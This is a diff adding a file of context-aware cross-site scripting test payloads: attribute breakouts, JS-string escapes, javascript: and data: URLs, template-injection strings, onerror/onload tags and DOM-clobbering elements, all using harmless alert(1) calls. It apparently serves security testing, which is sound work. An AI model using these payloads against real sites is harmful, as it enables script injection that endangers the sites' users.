@@ -1,0 +1,24 @@
+# Advanced context-aware XSS test strings (safe payloads)
+# HTML attribute contexts
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onmouseover=alert(1) x="
+# JS string contexts
+";alert(1);//
+';alert(1)//
+`)}}alert(1)}//
+# URL/JS URL contexts
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+# Template contexts (Angular/Vue/Handlebars)
+{{7*7}}
+{{constructor.constructor('alert(1)')()}}
+{{#with ""}}{{#each this}}{{/each}}{{/with}}
+{{=alert(1)}}
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+# DOM clobbering hints
+<form id=title></form>
+<iframe name=location></iframe>
+
+
